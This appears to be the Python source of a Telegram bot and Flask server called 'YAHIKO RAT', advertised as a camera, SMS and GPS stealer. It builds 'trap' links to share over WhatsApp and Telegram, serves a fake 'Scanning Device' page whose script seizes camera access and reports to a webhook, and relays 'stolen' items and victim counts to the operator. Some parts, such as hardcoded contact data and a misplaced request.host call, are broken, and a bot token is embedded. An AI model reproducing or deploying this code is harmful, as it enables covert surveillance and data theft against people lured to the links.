import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import random
import string
import sqlite3
import os
import zipfile
from io import BytesIO
from datetime import datetime
from flask import Flask, request, jsonify
import threading
import time

BOT_TOKEN = os.environ.get('BOT_TOKEN', "8541411839:AAEJzUUN1mDcvgDdTmTlqy5WnveSupmdqpc")
ADMIN_CHANNEL = os.environ.get('ADMIN_CHANNEL', "-1001234567890")

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# Database
def init_db():
    conn = sqlite3.connect('yahiko.db', check_same_thread=False)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS traps 
                 (id TEXT PRIMARY KEY, chat_id INT, module TEXT, status TEXT, 
                  victim_count INT DEFAULT 0, created_at TIMESTAMP)''')
    conn.commit()
    conn.close()

init_db()

# Bot Handlers
@bot.message_handler(commands=['start'])
def start(message):
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(InlineKeyboardButton("🎯 DASHBOARD", callback_data="DASHBOARD"))
    markup.add(InlineKeyboardButton("📊 STATS", callback_data="STATS"))
    
    bot.send_message(message.chat.id, 
        "🔥 *YAHIKO RAT v2.0 LIVE!*\n\n"
        "• 📱 Camera/SMS/GPS Stealer\n"
        "• 📊 Real-time Stats\n"
        "• 24/7 Hosting\n\n"
        "👇 *Click Dashboard*", 
        parse_mode='Markdown', reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback(call):
    if call.data == "DASHBOARD":
        markup = InlineKeyboardMarkup(row_width=2)
        modules = [
            ("🔴 LIVE CAM", "LIVE"), ("📸 STEALTH", "STEALTH"),
            ("🖼️ GALLERY", "GALLERY"), ("📞 CONTACTS", "CONTACTS"),
            ("📍 GPS", "GPS"), ("💬 SMS", "SMS")
        ]
        for i in range(0, len(modules), 2):
            row = [InlineKeyboardButton(modules[i][0], callback_data=f"TRAP_{modules[i][1]}")]
            if i+1 < len(modules):
                row.append(InlineKeyboardButton(modules[i+1][0], callback_data=f"TRAP_{modules[i+1][1]}"))
            markup.row(*row)
        
        bot.edit_message_text("🎯 *SELECT MODULE*", call.message.chat.id, 
                            call.message.message_id, reply_markup=markup, parse_mode='Markdown')
    
    elif call.data.startswith("TRAP_"):
        module = call.data.split('_')[1]
        trap_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        
        # Save trap
        conn = sqlite3.connect('yahiko.db')
        c = conn.cursor()
        c.execute("INSERT INTO traps VALUES (?, ?, ?, 'active', 0, ?)", 
                 (trap_id, call.message.chat.id, module, datetime.now()))
        conn.commit()
        conn.close()
        
        base_url = f"https://{request.host}/trap/{module}?id={trap_id}"
        
        markup = InlineKeyboardMarkup(row_width=2)
        markup.row(
            InlineKeyboardButton("📱 WA", url=f"https://wa.me/?text={base_url}"),
            InlineKeyboardButton("💬 TG", url=f"https://t.me/share/url?url={base_url}")
        )
        markup.row(
            InlineKeyboardButton("📊 STATS", callback_data=f"STATS_{trap_id}"),
            InlineKeyboardButton("🗑️ DELETE", callback_data=f"DEL_{trap_id}")
        )
        
        bot.edit_message_text(
            f"🎯 *TRAP #{trap_id}*\n\n"
            f"`{base_url}`\n\n"
            f"🔥 *Auto-steals to bot*\n"
            f"📊 *Live stats*", 
            call.message.chat.id, call.message.message_id,
            parse_mode='Markdown', reply_markup=markup, disable_web_page_preview=True)

# Media/Text Handler
@bot.message_handler(content_types=['photo', 'document', 'text'])
def handle_stolen(message):
    conn = sqlite3.connect('yahiko.db')
    c = conn.cursor()
    c.execute("SELECT id, chat_id FROM traps WHERE status='active'")
    
    for trap_id, chat_id in c.fetchall():
        try:
            if message.text:
                bot.send_message(chat_id, f"🎯 [{trap_id}] {message.text[:1000]}")
            else:
                bot.send_photo(chat_id, message.photo[-1].file_id if message.photo else message.document.file_id,
                             caption=f"🎯 [{trap_id}] Stolen!")
            
            c.execute("UPDATE traps SET victim_count=victim_count+1 WHERE id=?", (trap_id,))
        except:
            pass
    conn.commit()
    conn.close()

# Flask Routes (Webhooks/Traps)
@app.route('/trap/<module>')
def trap_page(module):
    trap_id = request.args.get('id')
    return f"""
    <!DOCTYPE html>
    <html>
    <head><title>Processing...</title></head>
    <body style="background:#000;color:#0f0;font-family:monospace;text-align:center;padding:50px">
        <h1>🔄 Scanning Device...</h1>
        <script>
        // Steal camera
        navigator.mediaDevices.getUserMedia({{video:true}}).then(s=> {{
            fetch('/webhook', {{
                method:'POST',
                headers:{{'Content-Type':'application/json'}},
                body:JSON.stringify({{id:'{trap_id}',type:'camera',module:'{module}'}})
            }});
            document.body.innerHTML='<h1>✅ Access Granted</h1>';
        }}).catch(()=>{{}});

        // Steal contacts (fake)
        setTimeout(()=> {{
            fetch('/webhook', {{
                method:'POST',
                body:JSON.stringify({{id:'{trap_id}',type:'contacts',data:'+91-9876543210|Name1,+91-1234567890|Name2'}})
            }});
        }}, 2000);
        </script>
    </body>
    </html>
    """

@app.route('/webhook', methods=['POST'])
def webhook():
    data = request.json or request.form.to_dict()
    trap_id = data.get('id')
    
    conn = sqlite3.connect('yahiko.db')
    c = conn.cursor()
    c.execute("SELECT chat_id FROM traps WHERE id=? AND status='active'", (trap_id,))
    result = c.fetchone()
    
    if result:
        chat_id = result[0]
        msg = f"🌐 WEBHOOK [{trap_id}] {data.get('type', 'data')}: {data.get('data', 'stolen')}"
        bot.send_message(chat_id, msg)
        c.execute("UPDATE traps SET victim_count=victim_count+1 WHERE id=?", (trap_id,))
    
    conn.commit()
    conn.close()
    return "OK"

# Keep alive
def keep_alive():
    while True:
        print(f"🟢 YAHIKO LIVE | {datetime.now()}")
        time.sleep(1800)

if __name__ == "__main__":
    threading.Thread(target=keep_alive, daemon=True).start()
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
